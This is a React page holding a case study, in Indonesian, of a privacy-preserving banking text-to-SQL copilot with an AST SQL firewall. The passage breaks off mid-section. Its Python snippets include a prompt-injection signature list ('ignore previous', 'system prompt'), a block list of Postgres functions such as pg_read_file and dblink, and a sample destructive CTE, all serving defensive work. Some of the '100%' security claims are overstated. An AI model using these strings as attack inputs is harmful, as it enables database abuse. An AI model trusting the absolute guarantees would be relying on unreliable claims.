"use client";

import React, { useState } from "react";
import Link from "next/link";
import {
  ArrowLeft,
  Check,
  Copy,
  ExternalLink,
  ShieldCheck,
  Database,
  Lock,
  FileCode,
  Layers,
  Clock,
  AlertTriangle,
  RefreshCw,
  Search,
  KeyRound,
  FileText,
  Terminal,
  Cpu,
  EyeOff,
  SlidersHorizontal,
} from "lucide-react";

// ==========================================
// CODE BLOCK COMPONENT WITH COPY BUTTON
// ==========================================
function CodeBlock({
  filename,
  language = "python",
  code,
}: {
  filename: string;
  language?: string;
  code: string;
}) {
  const [copied, setCopied] = useState(false);

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(code);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch {
      // fallback
    }
  };

  return (
    <div className="my-5 rounded-xl border border-zinc-800 bg-zinc-950 text-zinc-100 overflow-hidden shadow-sm">
      {/* Code Header */}
      <div className="flex items-center justify-between px-4 py-2.5 bg-zinc-900 border-b border-zinc-800 text-xs font-mono">
        <div className="flex items-center gap-2 text-zinc-300">
          <FileCode className="w-3.5 h-3.5 text-zinc-400" />
          <span className="font-medium text-zinc-200">{filename}</span>
        </div>
        <div className="flex items-center gap-2">
          <span className="text-[10px] uppercase tracking-wider text-zinc-400 font-semibold px-2 py-0.5 rounded bg-zinc-800 border border-zinc-700/60">
            {language}
          </span>
          <button
            onClick={handleCopy}
            type="button"
            className="flex items-center gap-1.5 px-2 py-1 rounded hover:bg-zinc-800 text-zinc-400 hover:text-white transition-colors text-xs"
            title="Copy code"
          >
            {copied ? (
              <>
                <Check className="w-3.5 h-3.5 text-emerald-400" />
                <span className="text-emerald-400 font-sans text-[11px]">Copied</span>
              </>
            ) : (
              <>
                <Copy className="w-3.5 h-3.5" />
                <span className="font-sans text-[11px]">Copy</span>
              </>
            )}
          </button>
        </div>
      </div>

      {/* Code Body */}
      <div className="p-4 overflow-x-auto text-xs sm:text-[13px] leading-relaxed font-mono">
        <pre className="text-zinc-200 font-mono">
          <code>{code}</code>
        </pre>
      </div>
    </div>
  );
}

export default function SentraSafeQueryCaseStudyPage() {
  // Code snippet 1: Inbound Zero-Exposure PII Shielding & Ephemeral SessionVault
  const codeLayer1 = `# Path: sentra-safequery/security/pii_shield.py
import re
import uuid
from typing import Tuple, Dict

class SessionVault:
    """Ruang penyimpanan volatil in-memory per sesi untuk de-tokenisasi parameter terisolasi."""
    def __init__(self, session_id: str):
        self.session_id = session_id
        self._vault: Dict[str, str] = {}
        self._reverse_vault: Dict[str, str] = {}

    def store(self, token_type: str, real_value: str) -> str:
        if real_value in self._reverse_vault:
            return self._reverse_vault[real_value]
        token = f"[{token_type}_{len(self._vault) + 1:02d}]"
        self._vault[token] = real_value
        self._reverse_vault[real_value] = token
        return token

    def get_real_value(self, token: str) -> str:
        return self._vault.get(token, token)

# Pola Regex spesifik identitas perbankan Indonesia
NIK_PATTERN = re.compile(r'\\b[1-9]\\d{5}(?:0[1-9]|[12]\\d|3[01])(?:0[1-9]|1[0-2])\\d{2}\\d{4}\\b')
ACCOUNT_PATTERN = re.compile(r'\\b\\d{10,15}\\b')
NAME_CONTEXT_PATTERN = re.compile(r'(?:atas nama|nasabah|pemilik rekening|bernama)\\s+([A-Z][a-zA-Z\\s]{2,30})', re.IGNORECASE)

def sanitize_inbound_query(raw_query: str, vault: SessionVault) -> Tuple[str, bool]:
    """Mencegat dan menganonimkan entitas PII sebelum koneksi API LLM eksternal."""
    sanitized = raw_query

    # 1. Deteksi & Masking NIK 16-Digit
    for nik in NIK_PATTERN.findall(sanitized):
        token = vault.store("NIK", nik)
        sanitized = sanitized.replace(nik, token)

    # 2. Deteksi & Masking Nama Kontekstual Operasional
    for match in NAME_CONTEXT_PATTERN.finditer(raw_query):
        real_name = match.group(1).strip()
        token = vault.store("PERSON", real_name)
        sanitized = sanitized.replace(real_name, token)

    # 3. Deteksi Rekening Perbankan
    for acc in ACCOUNT_PATTERN.findall(sanitized):
        token = vault.store("ACCOUNT", acc)
        sanitized = sanitized.replace(acc, token)

    # 4. Mitigasi Prompt Injection / Jailbreak
    injection_signatures = ["ignore previous", "bypass", "drop table", "system prompt", "exec("]
    contains_injection = any(sig in raw_query.lower() for sig in injection_signatures)

    return sanitized, contains_injection`;

  // Code snippet 2: AST SQL Firewall using sqlglot
  const codeLayer3 = `# Path: sentra-safequery/compiler/ast_firewall.py
import sqlglot
from sqlglot import exp
from typing import Tuple, Optional

# Fungsi sistem dan eksploitasi berbahaya yang diblokir mutlak
FORBIDDEN_FUNCTIONS = {"pg_sleep", "dblink", "version", "pg_read_file", "load_file", "system_user"}

class ASTFirewallException(Exception):
    """Pengecualian spesifik jika AST SQL melanggar batas keamanan perbankan."""
    pass

def validate_and_harden_ast(generated_sql: str, max_row_limit: int = 100) -> Tuple[str, Optional[str]]:
    try:
        # 1. Statement Chaining Detector (Mencegah multi-pernyataan via titik koma)
        parsed_statements = sqlglot.parse(generated_sql, read="postgres")
        if len(parsed_statements) != 1:
            raise ASTFirewallException("Multi-statement query terdeteksi (Statement Chaining ditolak).")

        tree = parsed_statements[0]

        # 2. Root Node Type Assertion (Hanya menerima SELECT read-only)
        if not isinstance(tree, exp.Select):
            raise ASTFirewallException(f"Simpul akar tidak valid: {type(tree).__name__}. Wajib berupa SELECT.")

        # 3. Recursive Anti-Mutation Traversal (Menangkal injeksi manipulasi di dalam CTE)
        for node in tree.walk():
            if isinstance(node, (exp.Delete, exp.Drop, exp.Update, exp.Insert, exp.AlterTable, exp.Command)):
                raise ASTFirewallException(f"Operasi destruktif terdeteksi pada node AST: {type(node).__name__}")
            
            # 4. Function Call Blacklist Filter
            if isinstance(node, exp.Anonymous):
                if node.this.lower() in FORBIDDEN_FUNCTIONS:
                    raise ASTFirewallException(f"Pemanggilan fungsi terlarang: {node.this}()")

        # 5. Row-Limit Injection (Mencegah Unbounded Scan / DoS)
        existing_limit = tree.args.get("limit")
        if existing_limit:
            current_val = int(existing_limit.expression.this)
            if current_val > max_row_limit:
                tree.args["limit"] = exp.Limit(expression=exp.Literal.number(max_row_limit))
        else:
            tree.args["limit"] = exp.Limit(expression=exp.Literal.number(max_row_limit))

        # Kompilasi ulang AST yang telah diverifikasi
        hardened_sql = tree.sql(dialect="postgres")
        return hardened_sql, None

    except Exception as e:
        return "", str(e)`;

  // Code snippet 3: Parameter Bridge & Prepared Statement Execution
  const codeLayer4 = `# Path: sentra-safequery/database/parameter_bridge.py
from sqlalchemy import text
from sqlalchemy.engine import Engine
import re
from typing import Dict, Any, Tuple
import pandas as pd
from security.pii_shield import SessionVault

def build_parameterized_query(
    hardened_sql: str,
    vault: SessionVault
) -> Tuple[str, Dict[str, Any]]:
    """Mengonversi token anonim AST menjadi bind parameters SQLAlchemy (:param_01).
    Menjamin 100% imun terhadap SQL Injection (Bebas konkatenasi string)."""
    param_dict: Dict[str, Any] = {}
    token_pattern = re.compile(r'\\[(NIK|PERSON|ACCOUNT)_\\d{2}\\]')
    
    transformed_sql = hardened_sql

    def replace_with_bind(match):
        token = match.group(0)
        param_name = f"p_{token[1:-1].lower()}"
        real_value = vault.get_real_value(token)
        param_dict[param_name] = real_value
        return f":{param_name}"

    transformed_sql = token_pattern.sub(replace_with_bind, transformed_sql)
    return transformed_sql, param_dict

def execute_safe_query(engine: Engine, transformed_sql: str, param_dict: Dict[str, Any]) -> pd.DataFrame:
    """Eksekusi parameterized prepared statement secara aman."""
    stmt = text(transformed_sql)
    with engine.connect() as conn:
        result = conn.execute(stmt, param_dict)
        return pd.DataFrame(result.fetchall(), columns=result.keys())`;

  // Code snippet 4: Dual-Gate Outbound Masking & Audit Trail
  const codeLayer5 = `# Path: sentra-safequery/governance/dual_gate_masking.py
import pandas as pd
import logging

audit_logger = logging.getLogger("ISO_27001_AUDIT_LOG")

def mask_nik(val: str) -> str:
    """Pseudonimisasi visual: 340401******0001"""
    s = str(val)
    return s[:6] + "******" + s[-4:] if len(s) == 16 else "[MASKED_NIK]"

def apply_dual_gate_masking(df: pd.DataFrame, officer_id: str) -> Tuple[pd.DataFrame, pd.DataFrame]:
    """Gate 1: Strip mutlak untuk LLM Summary.
    Gate 2: Pseudonimisasi visual aman untuk tampilan UI frontline."""
    
    # 1. Gate 1 Dataframe (Untuk LLM Summarizer): Kolom PII dieliminasi 100%
    pii_columns = ["nik", "customer_name", "account_number", "phone_number"]
    llm_payload_df = df.drop(columns=[col for col in pii_columns if col in df.columns], errors="ignore")

    # 2. Gate 2 Dataframe (Untuk UI Frontline Mantri): Pseudonimisasi Visual
    ui_display_df = df.copy()
    if "nik" in ui_display_df.columns:
        ui_display_df["nik"] = ui_display_df["nik"].apply(mask_nik)
    if "customer_name" in ui_display_df.columns:
        ui_display_df["customer_name"] = [f"[NASABAH_{i+1:02d}]" for i in range(len(ui_display_df))]

    # 3. Pencatatan Audit Trail ISO 27001
    audit_logger.info({
        "event": "DATA_ACCESS_DISPATCH",
        "officer_id": officer_id,
        "rows_returned": len(df),
        "compliance": "UU_PDP_NO_27_2022"
    })

    return llm_payload_df, ui_display_df`;

  return (
    <div className="min-h-screen bg-[#FAFAFA] text-[#18181B] antialiased selection:bg-zinc-200 selection:text-zinc-900">
      {/* ======================================================== */}
      {/* 1. TOP-DOWN HERO SECTION (Full-Width Container)          */}
      {/* ======================================================== */}
      <header className="border-b border-zinc-200/90 bg-white/80 backdrop-blur-sm">
        <div className="max-w-6xl mx-auto px-6 pt-12 pb-10">
          {/* Back Button */}
          <Link
            href="/#selected-work"
            className="inline-flex items-center gap-2 text-xs font-mono uppercase tracking-wider text-zinc-500 hover:text-zinc-900 transition-colors mb-6 group"
          >
            <span className="transition-transform group-hover:-translate-x-1">←</span> Back to Overview
          </Link>

          {/* Metadata Row */}
          <div className="flex flex-wrap items-center gap-3 text-xs font-mono text-zinc-500 mb-4">
            <span className="font-semibold text-zinc-900">
              Core Banking Data Mart (Simulasi Bank BUMN)
            </span>
            <span>•</span>
            <span className="px-2.5 py-0.5 rounded-full bg-zinc-100 border border-zinc-200 font-medium text-zinc-700">
              AI Security & Applied Compilers
            </span>
            <span>•</span>
            <span className="text-zinc-400">Okt 2026</span>
          </div>

          {/* Main Title */}
          <h1 className="text-3xl sm:text-5xl font-bold tracking-tight text-zinc-950 max-w-4xl leading-[1.15] mb-4 font-sans">
            Sentra-SafeQuery: Privacy-Preserving Banking Text-to-SQL Copilot with AST Firewall
          </h1>

          {/* Subtitle / Executive Pitch */}
          <p className="text-zinc-600 text-base sm:text-lg max-w-3xl leading-relaxed mb-6 font-normal">
            Demokratisasi analisis data core banking untuk frontline staff (Mantri Bank) melalui inbound PII shielding, kamus semantik perbankan Indonesia, dan firewall kompiler AST nol-trust guna menjamin kepatuhan UU PDP No. 27/2022.
          </p>

          {/* Tag Pills */}
          <div className="flex flex-wrap gap-2 mb-8">
            {[
              "Python 3.12",
              "sqlglot AST Compiler",
              "SQLAlchemy 2.0",
              "Ephemeral SessionVault",
              "UU PDP No. 27/2022",
              "Streamlit Enterprise",
              "Dual-Gate Masking",
              "Prepared Statements",
            ].map((tag) => (
              <span
                key={tag}
                className="px-2.5 py-1 text-xs font-mono rounded-md bg-white border border-zinc-200/90 text-zinc-700 shadow-sm"
              >
                {tag}
              </span>
            ))}
          </div>

          {/* Quick Metrics / Specs Box (4-Grid Simetris) */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4 p-5 rounded-xl border border-zinc-200/90 bg-white shadow-sm">
            <div>
              <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400 mb-1">
                Target Persona
              </div>
              <div className="text-sm font-semibold text-zinc-900">
                Frontline Officers (Mantri Bank, CS, Supervisor)
              </div>
            </div>
            <div>
              <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400 mb-1">
                Inbound Privacy
              </div>
              <div className="text-sm font-semibold text-zinc-900">
                Ephemeral SessionVault (0% PII Leak)
              </div>
            </div>
            <div>
              <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400 mb-1">
                Security Barrier
              </div>
              <div className="text-sm font-semibold text-zinc-900">
                sqlglot AST SQL Compiler Firewall
              </div>
            </div>
            <div>
              <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400 mb-1">
                Dampak Efisiensi
              </div>
              <div className="text-sm font-semibold text-emerald-700">
                14 Hari → &lt;2.5s (~99.9% Latency Reduction)
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* ======================================================== */}
      {/* 2. MAIN READING AREA + SLIM STICKY SIDEBAR               */}
      {/* ======================================================== */}
      <main className="max-w-6xl mx-auto px-6 py-12">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 items-start">
          {/* SISI KIRI: SLIM STICKY RAIL (3 dari 12 Kolom / ~25%) */}
          <aside className="hidden lg:block lg:col-span-3 sticky top-8 space-y-8">
            {/* Quick Metadata */}
            <div className="space-y-4 pb-6 border-b border-zinc-200">
              <div>
                <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400">
                  Peran
                </div>
                <div className="text-sm font-semibold text-zinc-900 mt-0.5">
                  Lead AI Security & Data Platform
                </div>
              </div>
              <div>
                <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400">
                  Lingkup Sistem
                </div>
                <div className="text-sm font-semibold text-zinc-900 mt-0.5">
                  Simulasi Core Banking Bank BUMN
                </div>
              </div>
              <div>
                <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400">
                  Kepatuhan Hukum
                </div>
                <div className="text-xs font-semibold text-zinc-700 mt-0.5 font-mono">
                  UU PDP No. 27/2022 & Regulasi OJK / BI
                </div>
              </div>
              <div>
                <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400">
                  Fokus Rekayasa
                </div>
                <div className="text-xs text-zinc-600 mt-0.5 leading-relaxed">
                  AST Compiler Verification, Inbound Regex Tokenization, Zero-Concat Parameter Bridges & ISO 27001 Dual-Gate Masking
                </div>
              </div>
            </div>

            {/* Table of Contents */}
            <div>
              <div className="text-xs font-mono uppercase tracking-wider text-zinc-400 mb-3 font-semibold">
                Daftar Isi
              </div>
              <nav className="space-y-2 text-xs font-mono text-zinc-500">
                <a href="#bottlenecks" className="block hover:text-zinc-950 transition-colors py-0.5">
                  01. Bottleneck & Risiko Naive SQL
                </a>
                <a href="#defense-layers" className="block hover:text-zinc-950 transition-colors py-0.5">
                  02. Arsitektur 5-Layer Defense
                </a>
                <a href="#code-implementation" className="block hover:text-zinc-950 transition-colors py-0.5">
                  03. Implementasi Kompiler & Vault
                </a>
                <a href="#red-team-evaluation" className="block hover:text-zinc-950 transition-colors py-0.5">
                  04. Uji Red-Teaming & Benchmark
                </a>
                <a href="#operational-impact" className="block hover:text-zinc-950 transition-colors py-0.5">
                  05. Dampak Operasional & Bisnis
                </a>
                <a href="#takeaways" className="block hover:text-zinc-950 transition-colors py-0.5">
                  06. Kesimpulan Rekayasa
                </a>
              </nav>
            </div>
          </aside>

          {/* SISI KANAN / TENGAH: WIDE CASE STUDY CONTENT (9 dari 12 Kolom / ~75%) */}
          <article className="lg:col-span-9 space-y-14 text-zinc-700 leading-relaxed text-[15px] sm:text-base">
            
            {/* ======================================================== */}
            {/* SECTION 1: BOTTLENECKS                                   */}
            {/* ======================================================== */}
            <section id="bottlenecks" className="space-y-5 scroll-mt-10">
              <h2 className="text-2xl font-bold tracking-tight text-zinc-950 border-b border-zinc-200 pb-3">
                01. Titik Kritis: Kegagalan BI Konvensional & Risiko Naive Text-to-SQL
              </h2>
              
              <h3 className="text-lg font-bold text-zinc-900 mt-4">
                Hambatan Analisis Ad-Hoc di Lapangan (The Mantri Bottleneck)
              </h3>
              <p>
                Dalam operasional perbankan mikro nasional, keputusan komersial paling vital diambil di lapangan oleh staf garis depan (seperti <strong className="text-zinc-900 font-semibold">Mantri Bank</strong> yang mengevaluasi kelayakan kredit UMKM di pasar tradisional). Namun, mereka menghadapi kendala struktural:
              </p>

              {/* Stack Vertikal 3 Bottleneck Cards */}
              <div className="space-y-4 my-6">
                
                {/* CARD 1: Mantri Bottleneck */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Bottleneck 01 // Field Operational Barrier
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5">
                        Kekakuan Filter Dashboard & Antrean Tiket IT (1–3 Minggu)
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-neutral-100 text-neutral-700 border border-neutral-200/60 whitespace-nowrap">
                      14-Day IT Ticket Lag
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Dashboard BI konvensional hanya menyediakan filter statis. Saat seorang Mantri membutuhkan hipotesis bisnis lintas-seksional (misal: <em>"Berapa rekening Simpedes milik pedagang pasar di unit tertentu yang saldonya di atas 10 juta tapi pasif tanpa transaksi selama 3 bulan?"</em>), staf terpaksa mengajukan tiket ke tim Data pusat dengan waktu tunggu berminggu-minggu, menyebabkan hilangnya momentum komersial.
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Dampak: Hilangnya Peluang Penyaluran Kredit</span>
                    <span className="font-semibold text-neutral-900">14 Hari SLA Tunggu Data</span>
                  </div>
                </div>

                {/* CARD 2: UU PDP Violation */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Bottleneck 02 // Regulatory & Privacy Exposure
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5">
                        Pelanggaran UU PDP No. 27/2022 pada Naive Text-to-SQL
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-neutral-100 text-neutral-700 border border-neutral-200/60 whitespace-nowrap">
                      Strict Bank Secrecy Law
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Mengirim kueri bahasa alami staf yang memuat NIK 16-digit, nama nasabah, atau saldo tabungan langsung ke API cloud eksternal merupakan tindak pidana pelanggaran privasi perbankan. Tanpa penapis lokal, data rahasia perbankan terekspos secara permanen ke server pihak ketiga.
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Dampak: Sanksi Hukum & Pidana Kepatuhan</span>
                    <span className="font-semibold text-neutral-900">Critical PII Exfiltration</span>
                  </div>
                </div>

                {/* CARD 3: Destructive Queries */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Bottleneck 03 // Destructive Query Execution
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5">
                        Manipulasi Prompt Jailbreak & Unbounded Scans (DoS)
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-neutral-100 text-neutral-700 border border-neutral-200/60 whitespace-nowrap">
                      Unbounded Mutation Risk
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Mengintegrasikan LLM mentah langsung ke database membuka risiko fatal: prompt injection dapat memanipulasi model untuk mengeksekusi operasi destruktif (<code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">DROP</code>, <code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">DELETE</code>, <code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">UPDATE</code>) atau memindai jutaan baris tanpa batas (<code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">LIMIT</code>) yang melumpuhkan thread basis data operasional.
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Dampak: Kerusakan Integritas Basis Data</span>
                    <span className="font-semibold text-neutral-900">Database Denial-of-Service</span>
                  </div>
                </div>

              </div>

              <p>
                <strong className="text-zinc-900 font-semibold">Sentra-SafeQuery</strong> dirancang sebagai gerbang pertahanan berlapis (<em>zero-trust pipeline</em>) yang membedah kueri bahasa alami menjadi SQL aman dan tervalidasi secara komprehensif sebelum menyentuh engine basis data perbankan.
              </p>
            </section>

            {/* ======================================================== */}
            {/* SECTION 2: 5-LAYER DEFENSE ARCHITECTURE                  */}
            {/* ======================================================== */}
            <section id="defense-layers" className="space-y-6 scroll-mt-10">
              <h2 className="text-2xl font-bold tracking-tight text-zinc-950 border-b border-zinc-200 pb-3">
                02. Arsitektur Pertahanan Berlapis (5-Layer Defense-in-Depth)
              </h2>
              <p>
                Sistem mengisolasi setiap tahapan siklus hidup kueri melalui lima lapisan proteksi independen:
              </p>

              {/* 5 Layer Cards */}
              <div className="space-y-4 my-6">
                
                {/* LAYER 1 */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Layer 01 // Inbound Privacy Shield
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5">
                        Ephemeral SessionVault & Boundary Tokenization
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-emerald-50 text-emerald-800 border border-emerald-200/70 whitespace-nowrap font-medium">
                      0% PII Cloud Exposure
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Teks kueri dicegat di memori host sebelum koneksi jaringan ke LLM terjadi. Identitas sensitif dideteksi menggunakan kombinasi batas regex (NIK 16-digit berbasis kode pos wilayah) dan penanda batas kontekstual operasional perbankan Indonesia (<em>"atas nama"</em>, <em>"nasabah"</em>, <em>"rekening milik"</em>). Nilai asli disimpan di <code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">SessionVault</code> volatil dan digantikan oleh token anonim: <code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">[NIK_01]</code>, <code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">[PERSON_01]</code>, <code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">[ACCOUNT_01]</code>.
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Mekanisme: In-Memory Volatile Masking</span>
                    <span className="font-semibold text-emerald-700">100% Kebocoran PII Dicegah</span>
                  </div>
                </div>

                {/* LAYER 2 */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Layer 02 // Semantic Grounding
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5">
                        Indonesian Banking Semantic Dictionary
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-blue-50 text-blue-800 border border-blue-200/70 whitespace-nowrap font-medium">
                      Zero Jargon Hallucination
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Mengeliminasi risiko halusinasi model fondasi terhadap istilah perbankan harian. Kamus semantik secara deterministik memetakan idiom operasional ke skema relasional:
                    <span className="block mt-2 font-mono text-xs bg-zinc-50 p-2.5 rounded border border-zinc-200 text-zinc-800 space-y-1">
                      <span>• "Rekening tidur / pasif" → accounts.status = 'DORMANT'</span><br />
                      <span>• "Pedagang / UMKM" → customers.segment = 'MIKRO'</span><br />
                      <span>• "Agen / AgenBRILink" → transactions.channel = 'AGEN_BRILINK'</span><br />
                      <span>• "Minggu ini / Bulan ini" → Aritmatika tanggal deterministik dialek SQL</span>
                    </span>
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Mekanisme: Deterministic Idiom Mapping</span>
                    <span className="font-semibold text-neutral-900">100% Valid Business Semantics</span>
                  </div>
                </div>

                {/* LAYER 3 */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Layer 03 // Compiler AST Security
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5">
                        Industrial AST SQL Firewall (sqlglot)
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-purple-50 text-purple-800 border border-purple-200/70 whitespace-nowrap font-medium">
                      Zero Destructive Mutations
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Membedah teks SQL ke dalam pohon sintaksis abstrak (Abstract Syntax Tree):
                    <ul className="list-disc pl-5 mt-2 space-y-1 text-xs text-zinc-600">
                      <li><strong>Validasi Tipe Pernyataan:</strong> Memastikan simpul akar (<em>root node</em>) wajib bertipe <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">exp.Select</code>.</li>
                      <li><strong>Pencegahan Statement Chaining:</strong> Menolak multi-pernyataan via pemisah titik koma.</li>
                      <li><strong>Penelusuran Rekursif Anti-Mutasi:</strong> Menelusuri seluruh anak simpul pohon rekursif guna menangkal injeksi manipulasi di dalam CTE (misal: <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">WITH stealth AS (DELETE ...) SELECT ...</code>).</li>
                      <li><strong>Blacklist Fungsi Eksploitatif:</strong> Memblokir fungsi pembocoran sistem atau serangan DoS (<code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">pg_sleep</code>, <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">dblink</code>, <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">version</code>, <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">pg_read_file</code>).</li>
                      <li><strong>Injeksi Batasan Baris:</strong> Menyuntikkan atau mereduksi batas baris maksimum (<code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">LIMIT &lt;= 100</code>) langsung pada struktur pohon AST.</li>
                    </ul>
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Mekanisme: Compiler Tree Node Inspection</span>
                    <span className="font-semibold text-purple-700">100% Serangan Destruktif Dinetralkan</span>
                  </div>
                </div>

                {/* LAYER 4 */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Layer 04 // Parameter Bridge
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5">
                        Prepared Statement Parameter De-Tokenization
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-emerald-50 text-emerald-800 border border-emerald-200/70 whitespace-nowrap font-medium">
                      Zero String Concatenation
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Menghubungkan kembali token anonim di SQL terverifikasi dengan data asli di <code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">SessionVault</code>. Rekonsiliasi dijalankan murni pada level <em>parameterized prepared statement</em> SQLAlchemy (<code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">:p_nik</code> → literal typed parameter) tanpa konkatenasi string biasa, menutup celah eksploitasi SQL Injection secara total.
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Mekanisme: Native SQLAlchemy Bindings</span>
                    <span className="font-semibold text-emerald-700">100% Imun SQL Injection</span>
                  </div>
                </div>

                {/* LAYER 5 */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Layer 05 // Outbound Governance
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5">
                        Dual-Gate Outbound Masking & ISO 27001 Audit Trail
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-neutral-100 text-neutral-700 border border-neutral-200/60 whitespace-nowrap font-medium">
                      ISO 27001 & UU PDP Compliant
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Menerapkan pengamanan ganda pasca-eksekusi:
                    <ul className="list-disc pl-5 mt-2 space-y-1 text-xs text-zinc-600">
                      <li><strong>Gate 1 (Ringkasan Eksekutif LLM):</strong> Seluruh kolom PII (<code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">nik</code>, <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">customer_name</code>, <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">account_number</code>) dihapus secara mutlak dari dataframe sebelum diserahkan ke model peringkas analitik.</li>
